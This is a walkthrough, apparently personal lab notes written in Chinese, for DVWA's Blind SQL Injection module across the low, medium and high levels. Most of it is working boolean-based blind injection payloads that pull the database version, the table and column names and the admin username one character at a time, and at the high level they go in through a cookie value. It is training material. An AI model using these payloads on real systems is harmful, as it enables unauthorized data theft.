# DVWA-SQL Injection (Blind)


## low 

注意一律建議在瀏覽器使用+號帶替空白，

```
使用--+
盡量不使用#號，因為#號不會被送到後端，除非使用%23


```



只會回顯兩種情況。
```
User ID exists in the database.
User ID is MISSING from the database.
```

邏輯判斷是否有注入
```
1'+and+1+--+
1'+and+0+--+
```


判斷version()長度

```
//10.6.8-MariaDB-1

1'+and+length(version())=14--+
1'+and+length(version())=15--+
1'+and+length(version())=16--+

```

猜version()字串
```
1' and substring(version(),1,1)=1 --+
1' and substring(version(),2,1)=0 --+
1' and substring(version(),3,1)='.' --+
1' and substring(version(),4,1)=6 --+
1' and substring(version(),5,1)='.' --+
1' and substring(version(),6,1)=8 --+
1' and substring(version(),7,1)='-' --+
1' and substring(version(),8,1)=M --+
1' and substring(version(),9,1)=a --+
1' and substring(version(),10,1)=r --+
1' and substring(version(),11,1)=i --+
1' and substring(version(),12,1)=a --+
1' and substring(version(),13,1)=D --+
1' and substring(version(),14,1)=B --+
1' and substring(version(),15,1)='-' --+
1' and substring(version(),16,1)=1 --+
```

資料庫名長度，和字串
```
1' and length(database())=4 --+



1' and substr((select database()),1,1) = 'd' --+

1' and substr((select database()),2,1) = 'v' --+

1' and substr((select database()),3,1) = 'w' --+

1' and substr((select database()),4,1) = 'a' --+
```


表數量 2
```
1' and  (Select count(table_name) fRoM  information_schema.tables  wHeRe  table_schema='dvwa') = 2 --+
```



第一章表的名子長度 5 第二章表的名子長度 9

```

1' and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1) = 5 --+

1' and (select length(table_name) from information_schema.tables where table_schema=database() limit 1,1) = 9 --+

```




第一章表的名子
users
```
select table_name from information_schema.tables where table_schema=database() limit 0,1;


select  substr( (select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1 ,1 );


select ascii( substr( (select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1 ,1 )  );


1' and ascii( substr( (select table_name from information_schema.tables where table_schema=database() limit 0,1) ,1 ,1 )  ) =117  --+
1' and ascii( substr( (select table_name from information_schema.tables where table_schema=database() limit 0,1) ,2 ,1 )  ) =115  --+
1' and ascii( substr( (select table_name from information_schema.tables where table_schema=database() limit 0,1) ,3 ,1 )  ) =101  --+
1' and ascii( substr( (select table_name from information_schema.tables where table_schema=database() limit 0,1) ,4 ,1 )  ) =114  --+
1' and ascii( substr( (select table_name from information_schema.tables where table_schema=database() limit 0,1) ,5 ,1 )  ) =115  --+


```



第一章表的欄位數 8

```
select count(column_name) from information_schema.columns where table_schema=database() and table_name='users';



1' and ( select count(column_name) from information_schema.columns where table_schema=database() and table_name='users') = 1 --+
.
.
.
.

1' and ( select count(column_name) from information_schema.columns where table_schema=database() and table_name='users') = 8 --+

```





第一欄的名子長度 7
```
select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1;

select length(column_name) from information_schema.columns where table_schema=database() and table_name='users' limit 0,1;

1' and (select length(column_name) from information_schema.columns where table_schema=database() and table_name='users' limit 0,1) = 7 --+
```









第一欄的名子
user_id
```
select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1;



(select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)


select substr(     (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)      ,1,1  );


select ascii(     substr(     (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)      ,1,1  )         );






1' and ascii(     substr(     (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)      ,1,1  )         )=117 --+



1' and ascii(     substr(     (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)      ,2,1  )         )=115 --+


1' and ascii(     substr(     (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)      ,3,1  )         )=101 --+



1' and ascii(     substr(     (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)      ,4,1  )         )=114 --+


1' and ascii(     substr(     (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)      ,5,1  )         )=95 --+


1' and ascii(     substr(     (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)      ,6,1  )         )=105 --+


1' and ascii(     substr(     (select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1)      ,7,1  )         )=100 --+


```






 查詢第一欄的第一筆資料長度 5

假設拿到第三欄位名為 user

```

select user from users limit 0,1;

select length(user) from users limit 0,1;


1' and (select length(user) from users limit 0,1) = 1 --+
1' and (select length(user) from users limit 0,1) = 2 --+
1' and (select length(user) from users limit 0,1) = 3 --+
1' and (select length(user) from users limit 0,1) = 4 --+
1' and (select length(user) from users limit 0,1) = 5 --+


```


查詢user欄的第一筆資料名稱
admin
```
select substr(user,1,1) from users limit 0,1;

select ascii(substr(user,1,1)) from users limit 0,1;



1' and (select ascii(substr(user,1,1)) from users limit 0,1) = 97  --+
1' and (select ascii(substr(user,2,1)) from users limit 0,1) = 100  --+
1' and (select ascii(substr(user,3,1)) from users limit 0,1) = 109  --+
1' and (select ascii(substr(user,4,1)) from users limit 0,1) = 105  --+
1' and (select ascii(substr(user,5,1)) from users limit 0,1) = 110  --+
```


## medium 


```
1 and 1--+
1 and 0--+


1+and+length(version())=16--+
```




## high


這題會分開兩個請求，其實注意看關鍵在於第二個，他有個在cookie 的id值，可以當作注入點 

所以是cookie 注入


我自己實測是 cookie 字段 用+號好像不是特別好用，會被轉譯，但用--(空格)可以。
如此麻煩，我們這邊推薦使用 #號，反正不是經過瀏覽器送過來的不需要擔心變成錨點。
其實也可以使用%23不過就麻煩。

總之在cookie字段目前避免+號，直接使用空白比較快，


```
1' and 1 #
1' and 0 #


1'+and+length(version())=16 #
```










## impossible


PDO無法